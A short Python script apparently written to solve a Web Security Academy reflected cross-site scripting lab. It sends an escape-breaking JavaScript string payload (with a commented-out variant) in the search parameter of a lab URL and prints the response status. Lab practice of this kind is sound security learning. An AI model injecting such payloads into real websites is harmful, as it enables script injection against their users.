import requests

url = "https://0a23009d033a74c5806321bd003400fe.web-security-academy.net/"
payload = r"\"-alert()}//"
# payload = r"""\"}-alert(1);//"""
print(payload)
resopnse = requests.get(f"{url}?search={payload}")
print(resopnse.status_code)
